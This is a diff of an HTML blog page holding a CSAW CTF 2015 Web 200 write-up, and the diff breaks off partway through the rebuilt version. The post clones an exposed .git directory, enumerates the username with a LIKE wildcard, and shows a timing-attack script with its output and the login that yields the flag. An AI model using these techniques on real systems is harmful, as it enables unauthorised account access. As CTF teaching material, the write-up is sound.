@@ -1,428 +1,159 @@
-<!DOCTYPE html>
-<html lang="en-us">
-
-<head>
-
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-
-  
-  <meta property="og:title" content="CSAW CTF 2015 - Web 200 Writeup" />
-  <meta property="twitter:title" content="CSAW CTF 2015 - Web 200 Writeup" />
-  
-  <meta property="og:site_name" content="Jordan Wright" />
-  <meta property="og:url" content="https://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-200-writeup/" />
-  <meta property="twitter:url" content="https://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-200-writeup/">
-
-
-  
-  <meta property="og:type" content="article" />
-
-  <meta property="og:article:published_time" content="2015-09-21T00:00:00Z" />
-
-  
-  <meta property="og:article:tag" content="csaw2015" />
-  
-  <meta property="og:article:tag" content="ctf" />
-  
-  <meta property="og:article:tag" content="writeup" />
-  
-
-  
-  <meta name="description" content="Security and Programming Blog" />
-  
-
-  
-
-  
-
-  <title>
-     CSAW CTF 2015 - Web 200 Writeup 
-  </title>
-
-
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <link rel="shortcut icon" href="https://jordan-wright.com/blog/images/favicon.ico">
-  <link rel="apple-touch-icon" href="https://jordan-wright.com/blog/images/apple-touch-icon.png" />
-
-  <link rel="stylesheet" type="text/css" href="/blog/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/blog/css/highlight.css" />
-  <link rel="stylesheet" type="text/css" href="https://jordan-wright.com/blog/css/nav.css" />
-  <link rel="stylesheet" type="text/css"
-    href="//fonts.googleapis.com/css?family=Lora:ital,wght@0,400;0,700;1,400;1,700|Open+Sans:700,400|Inconsolata" />
-
-
-  
-  
-  <link href="https://jordan-wright.com/blog/index.xml" rel="alternate" type="application/rss+xml" title="Jordan Wright" />
-  
-  
-  
-  <meta name="generator" content="Hugo 0.40.3" />
-
-  <link rel="canonical" href="https://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-200-writeup/" />
-
-  
-  <script>
-    (function (i, s, o, g, r, a, m) {
-      i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
-        (i[r].q = i[r].q || []).push(arguments)
-      }, i[r].l = 1 * new Date(); a = s.createElement(o),
-        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
-    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
-
-    ga('create', 'UA-44718701-1', 'auto');
-    ga('send', 'pageview');
-
-  </script>
-  
-
-  
-</head>
-
-<body class="nav-closed">
-
-  <div class="nav">
-    <h3 class="nav-title">Menu</h3>
-    <a href="#" class="nav-close">
-        <span class="hidden">Close</span>
-    </a>
-    <ul>
-        
-        
-        
-            
-            <li class="nav-opened" role="presentation">
-            	<a href="https://jordan-wright.com/">Home</a>
-            </li>
-        
-            
-            <li class="nav-opened" role="presentation">
-            	<a href="https://jordan-wright.com/contact/">Contact</a>
-            </li>
-        
-            
-            <li class="nav-opened" role="presentation">
-            	<a href="https://jordan-wright.com/projects/">Projects</a>
-            </li>
-        
-            
-            <li class="nav-opened" role="presentation">
-            	<a href="https://jordan-wright.com/blog/">Blog</a>
-            </li>
-        
-            
-            <li class="nav-opened" role="presentation">
-            	<a href="https://raidersec.blogspot.com">Raidersec</a>
-            </li>
-        
-    </ul>
-    
-    
-    <a class="subscribe-button icon-feed" href="https://jordan-wright.com/blog/index.xml">Subscribe</a>
-    
-</div>
-<span class="nav-cover"></span>
-
-
-  <div class="site-wrapper">
-
-
-
-
-<header class="main-header post-head no-cover">
-  <nav class="main-nav clearfix">
-
-
-  
-      <a class="menu-button" href="#"><span class="burger">&#9776;</span><span class="word">Menu</span></a>
-  
-  </nav>
-</header>
-
-
-
-<main class="content" role="main">
-
-
-
-
-  <article class="post post">
-
-    <header class="post-header">
-        <h1 class="post-title">CSAW CTF 2015 - Web 200 Writeup</h1>
-        <small></small>
-
-        <section class="post-meta">
-        
-          <time class="post-date" datetime="2015-09-21T00:00:00Z">
-            Sep 21, 2015
-          </time>
-        
-         
-          <span class="post-tag small"><a href="https://jordan-wright.com/blog/tags/csaw2015/">#csaw2015</a></span>
-         
-          <span class="post-tag small"><a href="https://jordan-wright.com/blog/tags/ctf/">#ctf</a></span>
-         
-          <span class="post-tag small"><a href="https://jordan-wright.com/blog/tags/writeup/">#writeup</a></span>
-         
-        </section>
-    </header>
-
-    <section class="post-content">
-      <img src="/blog/images/headers/csaw_200.png" alt="" class="pure-img" >
-
-
-<p>Web 200 was a fun challenge that required us to chain together a few basic concepts to get the flag. When navigating to the URL given, we see that the challenge is based on a &ldquo;Lawn Care Simulator 2015&rdquo;.
-
-<img src="/blog/images/blog/csaw2015/lawn_care.png"></p>
-
-<p>We can immediately see there&rsquo;s a sign in form, which might prove useful later. But before we get too far into that, let&rsquo;s view the page source. Opening up the source, we see the following javascript snippet:</p>
-<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">init</span><span class="p">(){</span>
-            <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;login_form&#39;</span><span class="p">).</span><span class="nx">onsubmit</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-                <span class="kd">var</span> <span class="nx">pass_field</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">);</span> 
-                <span class="nx">pass_field</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="nx">pass_field</span><span class="p">.</span><span class="nx">value</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Hex</span><span class="p">);</span>
-        <span class="p">};</span>
-        <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">(</span><span class="s1">&#39;.git/refs/heads/master&#39;</span><span class="p">).</span><span class="nx">done</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">version</span><span class="p">){</span><span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#version&#39;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">&#39;Version: &#39;</span> <span class="o">+</span>  <span class="nx">version</span><span class="p">.</span><span class="nx">substring</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">))});</span>
-        <span class="nx">initGrass</span><span class="p">();</span>
-<span class="p">}</span>
-</code></pre></div>
-<p>You&rsquo;ll notice that there&rsquo;s an ajax call being made to a <code>.git</code> directory. If this is a full Git repo, we should be able to clone it:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">jordan@temp:~$ git clone http://54.175.3.248:8089/.git web200
-jordan@temp:~$ ls web200
-___HINT___  jobs.html  premium.php  validate_pass.php
-index.html  js         sign_up.php</code></pre></div>
-<p><em>Nice!</em> Now we can dive into the PHP. The <code>__HINT__</code> didn&rsquo;t prove to useful to me, but maybe I just didn&rsquo;t <em>get</em> it. Let&rsquo;s get started by looking at the relevant parts of <code>premium.php</code>.</p>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-    <span class="k">require_once</span> <span class="s1">&#39;validate_pass.php&#39;</span><span class="p">;</span>
-    <span class="k">require_once</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="nv">$auth</span> <span class="o">=</span> <span class="nx">validate</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span><span class="p">){</span>
-            <span class="k">echo</span> <span class="s2">&#34;&lt;h1&gt;&#34;</span> <span class="o">.</span> <span class="nv">$flag</span> <span class="o">.</span> <span class="s2">&#34;&lt;/h1&gt;&#34;</span><span class="p">;</span>
-        <span class="p">}</span>
-        <span class="k">else</span> <span class="p">{</span>
-            <span class="k">echo</span> <span class="s2">&#34;&lt;h1&gt;Not Authorized&lt;/h1&gt;&#34;</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-    <span class="k">else</span> <span class="p">{</span>
-        <span class="k">echo</span> <span class="s2">&#34;&lt;h1&gt;You must supply a username and password&lt;/h1&gt;&#34;</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="cp">?&gt;</span>
-</code></pre></div>
-<p>It looks like our flag is found in <code>flag.php</code>. Unfortunately, we don&rsquo;t have that file, but it looks like <code>$flag</code> is printed if we authenticate correctly.</p>
-
-<p>The authentication is handled by the <code>validate(username, password)</code> function in <code>validate_pass.php</code>. Let&rsquo;s see what it looks like:</p>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-    <span class="o">&lt;</span><span class="nx">snip</span><span class="o">&gt;</span>
-    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
-    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT hash FROM users WHERE username=&#39;</span><span class="si">$user</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
-    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Query failed: &#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
-    <span class="nv">$line</span> <span class="o">=</span> <span class="nx">mysql_fetch_row</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">);</span>
-    <span class="nv">$hash</span> <span class="o">=</span> <span class="nv">$line</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">];</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$pass</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$hash</span><span class="p">))</span>
-        <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
-
-    <span class="nv">$index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="k">while</span><span class="p">(</span><span class="nv">$hash</span><span class="p">[</span><span class="nv">$index</span><span class="p">]){</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$pass</span><span class="p">[</span><span class="nv">$index</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$hash</span><span class="p">[</span><span class="nv">$index</span><span class="p">])</span>
-            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
-        <span class="c1"># Protect against brute force attacks
-</span><span class="c1"></span>        <span class="nx">usleep</span><span class="p">(</span><span class="mi">300000</span><span class="p">);</span>
-        <span class="nv">$index</span><span class="o">+=</span><span class="mi">1</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
-    <span class="o">&lt;</span><span class="nx">snip</span><span class="o">&gt;</span>
-<span class="cp">?&gt;</span>
-</code></pre></div>
-<p>This function gets the password hash from the given username and then compares it character by character with the hash provided. Keep in mind, our password was hashed in Javascript in the snippet shown above.</p>
-
-<p>We&rsquo;ll get back to the password comparison later. First, how do we get the username? We have one more file, <code>sign_up.php</code> that might help. Let&rsquo;s take a look:</p>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-    <span class="o">&lt;</span><span class="nx">snip</span><span class="o">&gt;</span>
-    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>
-    <span class="c1">// check to see if the username is available
-</span><span class="c1"></span>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT username FROM users WHERE username LIKE &#39;</span><span class="si">$user</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
-    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Query failed: &#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());</span>
-    <span class="nv">$line</span> <span class="o">=</span> <span class="nx">mysql_fetch_row</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$line</span> <span class="o">==</span> <span class="k">NULL</span><span class="p">){</span>
-        <span class="c1">// Signing up for premium is still in development
-</span><span class="c1"></span>        <span class="k">echo</span> <span class="s1">&#39;&lt;h2 style=&#34;margin: 60px;&#34;&gt;Lawn Care Simulator 2015 is currently in a private beta. Please check back later&lt;/h2&gt;&#39;</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">else</span> <span class="p">{</span>
-        <span class="k">echo</span> <span class="s1">&#39;&lt;h2 style=&#34;margin: 60px;&#34;&gt;Username: &#39;</span> <span class="o">.</span> <span class="nv">$line</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; is not available&lt;/h2&gt;&#34;</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="o">&lt;</span><span class="nx">snip</span><span class="o">&gt;</span>
-<span class="cp">?&gt;</span>
-</code></pre></div>
-<p>This function tries to look up the username given and, if it exists, will tell us the username isn&rsquo;t available. We could try guessing (I did), but that doesn&rsquo;t help. Let&rsquo;s look more closely at the code.</p>
-
-<p>The SQL statement is done via a <code>LIKE</code> condition. This allows us to use the <code>%</code> character as a wildcard. So, by trying the username <code>%</code>, we should get the username from the database.</p>
-
-<p><img src="/blog/images/blog/csaw2015/username.png"></p>
-
-<p>Awesome - our username is <code>~~FLAG~~</code>. Now we need to find the password.</p>
-
-<p>Going back to the code given in <code>validate_pass.php</code>, we see the following comparison</p>
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">    while($hash[$index]){
-        if ($pass[$index] != $hash[$index])
-            return false;
-        # Protect against brute force attacks
-        usleep(300000);
-        $index+=1;
-    }</code></pre></div>
-<p>This snippet checks our hash against the one pulled from the databse. It does this by checking each character. If the character is wrong, it returns false immediately. However, look at what happens if the character is right. It does a <code>usleep(300000)</code>, which is .3 seconds. This means that, if we check every character, one will take longer. This is a <strong>timing attack</strong>.</p>
-
-<p>I wrote a quick script to exploit this. Here is the final (not very good) code I wound up using:</p>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">import time
-import requests
-
-data = {
-	&#34;username&#34; : &#34;~~FLAG~~&#34;,
-	&#34;password&#34; : &#34;&#34;
-}
-
-url = &#34;http://54.175.3.248:8089/premium.php&#34;
-
-password = [&#39;a&#39;]*32 
-
-def send_request(password):
-	data[&#34;password&#34;] = password
-	start = time.time()
-	requests.post(url, data=data)
-	end = time.time()
-	return end - start	
-
-hex = &#34;0123456789abcdef&#34;
-
-for i in range(32):
-	max_time = 0
-	char = &#34;&#34;
-	index = 0
-	for j in hex:
-		temp_pass = password
-		temp_pass[i] = j
-		request_time = send_request(&#34;&#34;.join(temp_pass))
-		if request_time &gt;= max_time:
-			index = i
-			max_time = request_time
-			char = j
-	password[index] = char	
-	print &#34;&#34;.join(password)</code></pre></div>
-<p>This basically brute forces the password by checking each valid hex character to see which takes the longest amount of time. It does this for each character in the hash. Running the code produces the following output:</p>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">6aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-66aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-667aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-667eaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-667e2aaaaaaaaaaaaaaaaaaaaaaaaaaa
-667e21aaaaaaaaaaaaaaaaaaaaaaaaaa
-667e217aaaaaaaaaaaaaaaaaaaaaaaaa
-667e2176aaaaaaaaaaaaaaaaaaaaaaaa
-667e21766aaaaaaaaaaaaaaaaaaaaaaa
-667e217666aaaaaaaaaaaaaaaaaaaaaa
-667e217666aaaaaaaaaaaaaaaaaaaaaa
-667e217666a1aaaaaaaaaaaaaaaaaaaa
-667e217666a13aaaaaaaaaaaaaaaaaaa
-667e217666a13daaaaaaaaaaaaaaaaaa
-667e217666a13d3aaaaaaaaaaaaaaaaa
-667e217666a13d39aaaaaaaaaaaaaaaa
-667e217666a13d39aaaaaaaaaaaaaaaa
-667e217666a13d39a0aaaaaaaaaaaaaa
-667e217666a13d39a02aaaaaaaaaaaaa
-667e217666a13d39a023aaaaaaaaaaaa
-667e217666a13d39a0239aaaaaaaaaaa
-667e217666a13d39a02399aaaaaaaaaa
-667e217666a13d39a023995aaaaaaaaa
-667e217666a13d39a0239951aaaaaaaa
-667e217666a13d39a0239951eaaaaaaa
-667e217666a13d39a0239951efaaaaaa
-667e217666a13d39a0239951efeaaaaa
-667e217666a13d39a0239951efe2aaaa
-667e217666a13d39a0239951efe2daaa
-667e217666a13d39a0239951efe2deaa
-667e217666a13d39a0239951efe2de4a
-667e217666a13d39a0239951efe2de48</code></pre></div>
-<p>Now, all that&rsquo;s left is to login and get the flag. To bypass the javascript hashing, I just used the dev console (you could also do this in Python!):</p>
-<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">$.post(&#39;premium.php&#39;, {&#34;username&#34;: &#34;~~FLAG~~&#34;, &#34;password&#34; : &#34;667e217666a13d39a0239951efe2de48&#34;}).success(function(data){console.log(data)})
-&lt;head&gt;
-    &lt;title&gt;Lawn Care Simulator 2015&lt;/title&gt;
-    &lt;script src=&#34;//code.jquery.com/jquery-1.11.3.min.js&#34;&gt;&lt;/script&gt;
-    &lt;script src=&#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js&#34;&gt;&lt;/script&gt; 
-    &lt;link rel=&#34;stylesheet&#34; href=&#34;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css&#34;&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;h1&gt;flag{gr0wth__h4ck!nG!1!1!&lt;/h1&gt;&lt;/body&gt;
-&lt;/html&gt;</code></pre></div>
-<p>And there we have the flag: <code>flag{gr0wth__h4ck!nG!1!1!}</code></p>
-
-<p>-Jordan (<a href="https://twitter.com/jw_sec">@jw_sec</a>)</p>
-    </section>
-
-
-  <footer class="post-footer">
-
-
-    
-    <figure class="author-image">
-        <a class="img" href="https://jordan-wright.com/blog/" style="background-image: url(https://jordan-wright.com/blog/images/jordan-profile.jpg)"><span class="hidden">Jordan Wright's Picture</span></a>
-    </figure>
-    
-
-    
-
-
-
-
-
-<section class="author">
-  <h4><a href="https://jordan-wright.com/blog/">Jordan Wright</a></h4>
-  
-  <p>Security Researcher, Open-Source Developer.</p>
-  
-  <div class="author-meta">
-    <span class="author-location icon-location">San Antonio, Texas</span>
-    
-  </div>
-</section>
-
-
-
-    
-<section class="share">
-  <h4>Share this post</h4>
-  <a class="icon-twitter" style="font-size: 1.4em" href="https://twitter.com/share?text=CSAW%20CTF%202015%20-%20Web%20200%20Writeup&nbsp;-&nbsp;Jordan%20Wright&amp;url=https%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f09%2f21%2fcsaw-ctf-2015-web-200-writeup%2f"
-      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-      <span class="hidden">Twitter</span>
-  </a>
-  <a class="icon-facebook" style="font-size: 1.4em" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f09%2f21%2fcsaw-ctf-2015-web-200-writeup%2f"
-      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-      <span class="hidden">Facebook</span>
-  </a>
-  <a class="icon-google-plus" style="font-size: 1.4em" href="https://plus.google.com/share?url=https%3a%2f%2fjordan-wright.com%2fblog%2f2015%2f09%2f21%2fcsaw-ctf-2015-web-200-writeup%2f"
-     onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-      <span class="hidden">Google+</span>
-  </a>
-</section>
-
-
-
-    
-
-
-
-
-  </footer>
-</article>
-
-</main>
-    </div>
-    <script type="text/javascript" src="https://jordan-wright.com/blog/js/jquery.js"></script>
-    <script type="text/javascript" src="https://jordan-wright.com/blog/js/jquery.fitvids.js"></script>
-    <script type="text/javascript" src="https://jordan-wright.com/blog/js/index.js"></script>
-    
-</body>
-</html>
-
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta property="og:title" content="CSAW CTF 2015 - Web 200 Writeup &#183; Jordan Wright"><meta property="og:site_name" content="Jordan Wright"><meta property="og:url" content="https://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-200-writeup/"><meta property="og:type" content="article"><meta property="og:article:published_time" content="2015-09-21T00:00:00Z"><meta property="og:article:tag" content="csaw2015"><meta property="og:article:tag" content="ctf"><meta property="og:article:tag" content="writeup"><title>CSAW CTF 2015 - Web 200 Writeup &#183; Jordan Wright</title><meta name=description content="Security and Programming Blog"><meta name=HandheldFriendly content="True"><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" href=https://jordan-wright.com/blog/images/favicon.ico><link rel=apple-touch-icon href=https://jordan-wright.com/blog/images/apple-touch-icon.png><link rel=stylesheet type=text/css href=https://jordan-wright.com/blog/css/screen.css><link rel=stylesheet type=text/css href=https://jordan-wright.com/blog/css/highlight.css><link rel=stylesheet type=text/css href=https://jordan-wright.com/blog/css/nav.css><link rel=stylesheet type=text/css href="//fonts.googleapis.com/css?family=Lora:ital,wght@0,400;0,700;1,400;1,700|Open+Sans:700,400|Inconsolata"><link href=https://jordan-wright.com/blog/index.xml rel=alternate type=application/rss+xml title="Jordan Wright"><meta name=generator content="Hugo 0.154.5"><link rel=canonical href=https://jordan-wright.com/blog/2015/09/21/csaw-ctf-2015-web-200-writeup/><script>(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","//www.google-analytics.com/analytics.js","ga"),ga("create","UA-44718701-1","auto"),ga("send","pageview")</script></head><body class=nav-closed><div class=nav><h3 class=nav-title>Menu</h3><a href=# class=nav-close><span class=hidden>Close</span></a><ul><li class=nav-opened role=presentation><a href=https://jordan-wright.com/>Home</a></li><li class=nav-opened role=presentation><a href=https://jordan-wright.com/contact/>Contact</a></li><li class=nav-opened role=presentation><a href=https://jordan-wright.com/projects/>Projects</a></li><li class=nav-opened role=presentation><a href=https://jordan-wright.com/blog/>Blog</a></li><li class=nav-opened role=presentation><a href=https://raidersec.blogspot.com>Raidersec</a></li></ul><a class="subscribe-button icon-feed" href=https://jordan-wright.com/blog/index.xml>Subscribe</a></div><span class=nav-cover></span><div class=site-wrapper><header class="main-header post-head no-cover"><nav class="main-nav clearfix"><a class=menu-button href=#><span class=burger>&#9776;</span><span class=word>Menu</span></a></nav></header><main class=content role=main><article class="post post"><header class=post-header><h1 class=post-title>CSAW CTF 2015 - Web 200 Writeup</h1><small></small><section class=post-meta><time class=post-date datetime=2015-09-21T00:00:00Z>Sep 21, 2015
+</time><span class="post-tag small"><a href=https://jordan-wright.com/blog/tags/csaw2015/>#csaw2015</a></span>
+<span class="post-tag small"><a href=https://jordan-wright.com/blog/tags/ctf/>#ctf</a></span>
+<span class="post-tag small"><a href=https://jordan-wright.com/blog/tags/writeup/>#writeup</a></span></section></header><section class=post-content><img src=/blog/images/headers/csaw_200.png alt class=pure-img><p>Web 200 was a fun challenge that required us to chain together a few basic concepts to get the flag. When navigating to the URL given, we see that the challenge is based on a &ldquo;Lawn Care Simulator 2015&rdquo;.</p><img src=/blog/images/blog/csaw2015/lawn_care.png><p>We can immediately see there&rsquo;s a sign in form, which might prove useful later. But before we get too far into that, let&rsquo;s view the page source. Opening up the source, we see the following javascript snippet:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>init</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;login_form&#39;</span><span class=p>).</span><span class=nx>onsubmit</span> <span class=o>=</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=kd>var</span> <span class=nx>pass_field</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;password&#39;</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl>                <span class=nx>pass_field</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>CryptoJS</span><span class=p>.</span><span class=nx>MD5</span><span class=p>(</span><span class=nx>pass_field</span><span class=p>.</span><span class=nx>value</span><span class=p>).</span><span class=nx>toString</span><span class=p>(</span><span class=nx>CryptoJS</span><span class=p>.</span><span class=nx>enc</span><span class=p>.</span><span class=nx>Hex</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>};</span>
+</span></span><span class=line><span class=cl>        <span class=nx>$</span><span class=p>.</span><span class=nx>ajax</span><span class=p>(</span><span class=s1>&#39;.git/refs/heads/master&#39;</span><span class=p>).</span><span class=nx>done</span><span class=p>(</span><span class=kd>function</span><span class=p>(</span><span class=nx>version</span><span class=p>){</span><span class=nx>$</span><span class=p>(</span><span class=s1>&#39;#version&#39;</span><span class=p>).</span><span class=nx>html</span><span class=p>(</span><span class=s1>&#39;Version: &#39;</span> <span class=o>+</span>  <span class=nx>version</span><span class=p>.</span><span class=nx>substring</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>6</span><span class=p>))});</span>
+</span></span><span class=line><span class=cl>        <span class=nx>initGrass</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>You&rsquo;ll notice that there&rsquo;s an ajax call being made to a <code>.git</code> directory. If this is a full Git repo, we should be able to clone it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>jordan@temp:~$ git clone http://54.175.3.248:8089/.git web200
+</span></span><span class=line><span class=cl>jordan@temp:~$ ls web200
+</span></span><span class=line><span class=cl>___HINT___  jobs.html  premium.php  validate_pass.php
+</span></span><span class=line><span class=cl>index.html  js         sign_up.php
+</span></span></code></pre></div><p><em>Nice!</em> Now we can dive into the PHP. The <code>__HINT__</code> didn&rsquo;t prove to useful to me, but maybe I just didn&rsquo;t <em>get</em> it. Let&rsquo;s get started by looking at the relevant parts of <code>premium.php</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>    <span class=k>require_once</span> <span class=s1>&#39;validate_pass.php&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>require_once</span> <span class=s1>&#39;flag.php&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$auth</span> <span class=o>=</span> <span class=nx>validate</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>],</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$auth</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;&lt;h1&gt;&#34;</span> <span class=o>.</span> <span class=nv>$flag</span> <span class=o>.</span> <span class=s2>&#34;&lt;/h1&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;&lt;h1&gt;Not Authorized&lt;/h1&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
